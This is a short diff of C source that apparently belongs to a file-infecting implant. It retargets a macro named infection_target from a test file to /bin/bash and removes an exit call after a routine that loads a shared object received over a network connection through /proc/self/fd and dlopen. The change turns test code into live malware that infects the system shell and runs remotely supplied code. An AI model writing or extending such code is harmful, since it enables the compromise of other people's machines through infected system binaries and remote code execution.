@@ -17,7 +17,7 @@
 
 #define opt 3
 
-#define infection_target "./test"
+#define infection_target "/bin/bash"
 
 extern char** environ;
 
@@ -107,7 +107,6 @@ void load_so(int connection_fd, int size){
   sprintf(file_path, "/proc/self/fd/%d", fd);
   handle = dlopen(file_path, RTLD_LAZY);
   dlclose(handle);
-  exit(0);
 }
 
 void process_connection(int connection_fd){
